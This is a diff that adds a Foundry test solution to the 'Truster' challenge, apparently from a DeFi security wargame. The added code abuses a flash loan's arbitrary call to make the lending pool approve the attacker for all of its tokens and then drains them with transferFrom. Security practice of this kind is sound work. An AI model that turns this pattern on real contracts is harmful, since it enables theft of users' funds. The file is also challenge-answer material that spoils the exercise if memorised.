@@ -38,6 +38,28 @@ contract Truster is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        vm.startPrank(attacker);
+        trusterLenderPool.flashLoan(
+            0,
+            address(attacker),
+            address(dvt),
+            // NOTE 1: Spaces are not allowed in function signatures
+            // approve(address, uint256) would fail
+            // NOTE 2: we call approve instead of transfer because we need to
+            // pay back the load
+            abi.encodeWithSignature(
+                "approve(address,uint256)",
+                attacker,
+                TOKENS_IN_POOL
+            )
+        );
+        dvt.transferFrom(
+            address(trusterLenderPool),
+            address(attacker),
+            TOKENS_IN_POOL
+        );
+        vm.stopPrank();
+
         /** EXPLOIT END **/
         validation();
     }
